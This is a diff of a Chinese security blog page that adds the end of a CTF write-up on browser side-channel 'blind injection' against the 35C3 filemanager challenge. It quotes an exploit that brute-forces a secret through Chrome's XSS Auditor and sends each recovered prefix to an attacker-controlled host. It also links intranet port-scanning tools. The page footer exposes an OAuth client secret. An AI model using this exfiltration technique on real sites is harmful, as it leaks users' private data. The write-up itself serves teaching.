+<h2 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag!"></a>Get Flag!</h2><p>利用以上知识，我们就能获取Flag了~</p>
+<h3 id="EXP原理"><a href="#EXP原理" class="headerlink" title="EXP原理"></a>EXP原理</h3><p>先贴上<a href="https://gist.githubusercontent.com/l4wio/3a6e9a7aea5acd7a215cdc8a8558d176/raw/1d8493902084361ad5ca5ff142f78388a00a0f20/go.html" target="_blank" rel="noopener">@l4wio</a>表哥的EXP。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> URL = <span class="string">'https://filemanager.appspot.com/search?q=&#123;&#123;search&#125;&#125;&amp;a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b'</span>; <span class="comment">//触发Chrome XSS Auditor的url向量</span></span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> charset = <span class="string">'_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-https://gitee.com/ph0rse/images/raw/master/xz/:;&lt;=&gt;?@[\\]^`&#123;|&#125;~'</span>; <span class="comment">//允许遍历的字符集</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> brute = <span class="keyword">new</span> URLSearchParams(location.search).get(<span class="string">'brute'</span>) || <span class="string">'35C3_'</span>; <span class="comment">//当访问链接带有brute参数时，如go.html?brute=data，burte变量为参数内容。若没有burte参数，则brute变量的值为'35C3_'。</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">		<span class="function"><span class="keyword">function</span> <span class="title">guess</span><span class="params">(i)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">			<span class="keyword">var</span> go = brute + charset[i];<span class="comment">//35C3_拼接上猜测的下一个字符</span></span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> x = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);<span class="comment">//创建iframe框架</span></span></span><br><span class="line"><span class="actionscript">			x.name = <span class="string">'blah'</span>;</span></span><br><span class="line"><span class="actionscript">			<span class="keyword">var</span> calls = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">			x.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="undefined">				calls++;</span></span><br><span class="line"><span class="actionscript">				<span class="comment">//只有当二次及以上触发onload时才执行花括号里的内容</span></span></span><br><span class="line"><span class="actionscript">				<span class="keyword">if</span>(calls &gt; <span class="number">1</span>)&#123;  </span></span><br><span class="line"><span class="javascript">					<span class="built_in">console</span>.log(<span class="string">"GO IT ==&gt; "</span>,go);<span class="comment">//递归再次请求</span></span></span><br><span class="line"><span class="javascript">					location.href = <span class="string">'http://deptrai.l4w.pw/35c3/go.html?brute='</span>+<span class="built_in">escape</span>(go);</span></span><br><span class="line"><span class="javascript">					x.onload = <span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;;</span></span><br><span class="line"><span class="undefined">				&#125;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">var</span> anchor = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span></span><br><span class="line"><span class="undefined">				anchor.target = x.name;</span></span><br><span class="line"><span class="actionscript">				anchor.href = x.src+<span class="string">'#'</span>;</span></span><br><span class="line"><span class="undefined">				anchor.click();</span></span><br><span class="line"><span class="actionscript">				anchor = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="actionscript">			x.src = URL.replace(<span class="string">'&#123;&#123;search&#125;&#125;'</span>,go);</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.body.appendChild(x);</span></span><br><span class="line"><span class="javascript">			setTimeout(<span class="function"><span class="params">()</span> =&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.body.removeChild(x);</span></span><br><span class="line"><span class="actionscript">				guess(i+<span class="number">1</span>); <span class="comment">//递归尝试字符集中的下一个字符</span></span></span><br><span class="line"><span class="undefined">			&#125;,1000);</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">		guess(0);</span></span><br><span class="line"><span class="actionscript">		<span class="comment">// FLAG: 35C3_xss_auditor_for_the_win</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将此EXP放到一个公网可访问的地址上，并将<code>location.href = &#39;http://deptrai.l4w.pw/35c3/go.html?brute=&#39;+escape(go);</code>这一行，改为自己的公网地址。通过nc，将该公网地址发给Admin，让其点开就行。</p>
+<p>该EXP通过递归思维进行爆破，从字符集里依次取字符，拼接到’35C3_’上，若不是Flag里的一部分，则onload只执行一次；若加入字符后，是Flag里的一部分，则返回正常页面，但由于触发Chrome XSS Auditor，总共加载onload 3次。<br>第二次会触发以下逻辑：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(calls &gt; <span class="number">1</span>)&#123;  </span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"GO IT ==&gt; "</span>,go);<span class="comment">//递归再次请求</span></span><br><span class="line">	location.href = <span class="string">'http://deptrai.l4w.pw/35c3/go.html?brute='</span>+<span class="built_in">escape</span>(go);</span><br><span class="line">	x.onload = <span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>也就是说，携带上本次成功的案例，递归地进行下一轮爆破。</p>
+<p>#### </p>
+<p>这里我把真实Flag放到自己的账号上，模拟自己是拥有flag的Admin，来做一下测试：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-541e728a-1ed7-1.png" alt="Alt text"></p>
+<p>访问<code>http://deptrai.l4w.pw/35c3/go.html</code>（自己VPS上一堆环境……就不拿出来让师傅们日了……）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-544ba138-1ed7-1.png" alt="Alt text"><br>可以看到，界面一直在刷新，也就是进行盲注爆破~<br>直到遍历到<code>35C3_x</code>的时候，递归地进入了<code>http://deptrai.l4w.pw/35c3/go.html?burte=35C3_x</code>页面，开始下一个字符的爆破。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-5470678e-1ed7-1.png" alt="Alt text"></p>
+<p>最后通过查看<code>http://deptrai.l4w.pw/</code>(可换成自己的VPS)的访问日志，就能获得最终的Flag：<code>35C3_xss_auditor_for_the_win</code>。</p>
+<p>没有VPS的小伙伴，也可以通过<a href="https://03i0.com/" target="_blank" rel="noopener">@Sn00py</a>推荐的<a href="http://dnsbin.zhack.ca" target="_blank" rel="noopener">临时DNS解析网站</a>，来接收回显。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-548fdcae-1ed7-1.png" alt="Alt text"></p>
+<h3 id="端口爆破脚本"><a href="#端口爆破脚本" class="headerlink" title="端口爆破脚本"></a>端口爆破脚本</h3><p>本文只提及了Chrome和Firefox两种浏览器，国外有师傅做了全种类浏览器的异步内网端口扫描，直接把源码保存下来就能用：</p>
+<p><a href="https://blog.skylined.nl/LocalNetworkScanner/" target="_blank" rel="noopener">全种类浏览器内网端口扫描</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-54a1d3c8-1ed7-1.png" alt="Alt text"></p>
+<p><a href="http://portswigger-labs.net/portscan/" target="_blank" rel="noopener">异步内网IP扫描</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-54b99da0-1ed7-1.png" alt="Alt text"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>受限于篇幅，没能很全面地介绍前端中的扫描姿势，有时间的话，再补一篇……</p>
+<p>在这个XSS漏洞一直不被国内厂商重视，一片忽略的背景下……在“瘦服务端，厚客户端”的背景下……</p>
+<p>讲个笑话，某白帽子，发现一处主站XSS漏洞<br>A：Alert(1)大法！！！！！！<br>客服：忽略<br>B：【截图】小姐姐~这个XSS能探测到你们开着两个Redis端口诶~<br>客服：￥4000</p>
+<p>emmm，笑话有点冷，但好像挺真实的。不扩大战果，不展示危害，永远不被业务人员重视。在危害问题上稍微装X一点，貌似才是对整个安全生态有利的做法。</p>
+<p>hackone上，Google某登录页面没有上SSL，赏金500美刀。为这样的企业点赞！</p>
+<p>参考链接：<br><a href="http://wonderkun.cc/index.html/?p=747" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=747</a><br><a href="https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning" target="_blank" rel="noopener">https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning</a><br><a href="https://github.com/SkyLined/LocalNetworkScanner/" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner/</a><br><a href="http://portswigger-labs.net/portscan/" target="_blank" rel="noopener">http://portswigger-labs.net/portscan/</a><br><a href="https://gist.github.com/l4wio/3a6e9a7aea5acd7a215cdc8a8558d176" target="_blank" rel="noopener">https://gist.github.com/l4wio/3a6e9a7aea5acd7a215cdc8a8558d176</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>多谢支持<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/weixin.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/26/hello-world/" class="archive-article-date">
-  	<time datetime="2018-10-26T08:43:14.628Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/26/hello-world/">Hello World</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://ph0rse.me/2019/02/16/JavaScript前端盲注/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/06/27/奇淫异巧之PHP后门/" class="archive-article-date">
-  	<time datetime="2018-06-27T13:19:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-27</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/10/26/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Hello World</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/06/27/奇淫异巧之PHP后门/">奇淫异巧之PHP后门</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/12/Hello-before/" class="archive-article-date">
-  	<time datetime="2018-04-11T16:10:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/12/Hello-before/">Hello_before</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/12/RPO/" class="archive-article-date">
-  	<time datetime="2018-04-11T16:08:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/12/RPO/">RPO</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/12/Shodan/" class="archive-article-date">
-  	<time datetime="2018-04-11T16:01:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-12</time>
-</a>
-        </div>
-    	 
+  <div id="gitment-ctn"></div> 
+<link rel="stylesheet" href="//imsun.github.io/gitment/style/default.css">
+<script src="//imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+var gitment = new Gitment({
+  id: "http://ph0rse.me/2019/02/16/JavaScript前端盲注/",
+  owner: 'Ph0rse',
+  repo: 'Comment',
+  oauth: {
+    client_id: '21013233c949d272ecad',
+    client_secret: '115f7bf7faae2c3b005ca9677fb88b655282b9f8',
+  },
+})
+gitment.render('gitment-ctn')
+</script>
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/12/Shodan/">Shodan</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -372,8 +489,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
